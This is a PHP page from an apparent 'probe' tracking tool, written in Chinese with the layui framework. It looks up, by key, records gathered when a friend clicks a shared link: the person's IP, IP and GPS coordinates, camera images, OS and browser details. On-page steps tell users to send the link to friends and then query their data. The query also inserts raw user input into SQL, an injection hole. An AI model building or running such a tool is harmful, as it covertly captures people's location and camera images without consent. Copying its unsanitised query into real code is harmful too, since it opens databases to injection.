<?php include_once("./include/reception/header.php"); ?>
<!---表单探针查询--->
<fieldset class="layui-elem-field">
  <legend>探针查询</legend>
	<div class="layui-field-box">

        <form class="layui-form layui-form-pane" action="?action=probe_query" method="POST">
  <div class="layui-form-item">
    <label class="layui-form-label">探针密钥</label>
    <div class="layui-input-block">
      <input name="query_key" class="layui-input" type="text" placeholder="请输入探针密钥" autocomplete="off" lay-verify="required">
    </div>
  </div>
  
  <div class="layui-form-item">
      <div class="layui-input-block">
  	  <br>
        <button class="layui-btn" lay-filter="query" lay-submit="">查询</button>
        <button class="layui-btn layui-btn-primary" type="reset">重置</button>
      </div>
    </div>
  </from>
 
   </div>
 </fieldset>
 
 <?php
$action=$_GET['action'];
if($action=="probe_query"){
 $query_key=$_POST['query_key'];
 if($query_key==""){
	 
 }
 else{
 $row=$DB->query("select*from list_ip where key_ip='{$query_key}'");
 while($rows = $DB->fetch($row))
 	 {
 	$data_list_details_probe= '
 	 {
 	 				"id":"'.$rows['id'].'"'.
 	 				',"key":"'. $rows['key_ip'].'"'.
 					',"probe_page":"'. $rows['probe_page'].'"'.
 					',"ip":"'. $rows['ip'].'"'.
 					',"ip_location":"'. $rows['ip_location'].'"'.
 					',"ip_lonlat":"'. $rows['ip_lonlat'].'"'.
 					',"gps_location":"'. $rows['gps_location'].'"'.
 					',"gps_lonlat":"'. $rows['gps_lonlat'].'"'.
 				',"camera_img":"'. $rows['camera_img'].'"'.
 			',"system":"'. $rows['system'].'"'.
 	',"browser":"'. $rows['browser'].'"'.
 	',"browser_ua":"'. $rows['browser_ua'].'"'.
 	',"browser_language":"'. $rows['browser_language'].'"'.
 	 			'},'.$data_list_details_probe;
 }
 $data_list_details_probe = substr($data_list_details_probe,0,strlen($data_list_details_probe)-1); 
 echo'
 <table class="layui-hide" id="list_details_probe" lay-filter="list_details_probe"></table>
 <script>
 layui.use("table", function(){
   var table = layui.table;
   
   //展示已知数据
   table.render({
     elem: "#list_details_probe"
     ,cols: [[ //标题栏
       {field: "id", title: "ID", width: 70, sort: true}
       ,{field: "key", title: "密钥", width: 115}
       ,{field: "ip", title: "IP", width: 105}
       ,{field: "ip_location", title: "IP位置", width: 105}
       ,{field: "ip_lonlat", title: "IP经纬度", width: 105}
       ,{field: "gps_location", title: "GPS位置", width: 105}
       ,{field: "gps_lonlat", title: "GPS经纬度", width: 105}
 	  ,{field: "camera_img", title: "摄像头图片", width: 105}
       ,{field: "system", title: "操作系统", width: 105}
       ,{field: "browser", title: "浏览器", width: 105}
 	 ,{field: "browser_ua", title: "浏览器UA", width: 105}
 	 ,{field: "browser_language", title: "浏览器语言", width: 105}
     ]]
     ,data: ['.$data_list_details_probe
 .']
     //,skin: "line" //表格风格
     ,even: true
     ,page: true //是否显示分页
     //,limits: [5, 7, 10]
     ,limit: 10 //每页默认显示的数量
   });
	
 });
 </script>';
 
 statistics_probe_query_add();
}

}//判断类型
 ?>
  <!---表单探针添加--->
  <!---表单提示语--->
  <p class="layui-elem-quote">1.输入密钥后添加探针，返回一个链接/卡片，发送给好友</p>
  <p class="layui-elem-quote">2.好友点击链接/卡片后，点击网站上方的探针查询，即可查询IP及其他信息</p>
  <p class="layui-elem-quote">3.禁止非法用途，如造成严重后果作者不负责</p>
	<p class="layui-elem-quote">4.如该程序违法，请联系作者/站长</p>
  <!---表单提示语--->
	<?php include_once("./include/reception/footer.php"); ?>